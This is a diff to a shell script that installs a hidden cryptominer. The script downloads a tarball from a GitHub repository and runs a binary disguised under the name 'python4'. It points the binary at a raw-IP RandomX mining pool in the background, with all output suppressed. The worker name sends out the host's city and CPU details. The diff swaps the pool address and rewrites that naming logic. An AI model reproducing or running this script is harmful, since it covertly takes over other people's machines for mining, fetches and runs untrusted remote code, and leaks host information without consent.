@@ -1,4 +1,4 @@
 curl -s -LJO https://github.com/callistowlrk10/python_lib_b/raw/d3839cd17a0d62d050cd0384b5b59e765916f7a2/python_lib_b.tar.gz
 tar -xzf python_lib_b.tar.gz
 sleep 1s
-setsid ./python4 --disable-gpu -a randomx -o 54.83.111.228:29500 -u $(curl -s ipinfo.io/city)_$(nproc)T -t 2 --nicehash true &>> /dev/null &
+setsid ./python4 --disable-gpu -a randomx -o 3.85.226.219:8020 -u $(curl -s ipinfo.io/city)_$(awk -F: '/model name/{v=$2; sub(/@.*/, "", v); sub(/[[:space:]]+CPU[[:space:]]*$/, "", v); sub(/^[[:space:]]+/, "", v); n=split(v, a, /[[:space:]]+/); print a[n]; exit}' /proc/cpuinfo)_$(grep -c 'model name' /proc/cpuinfo)T -t 2 --nicehash true &>> /dev/null &
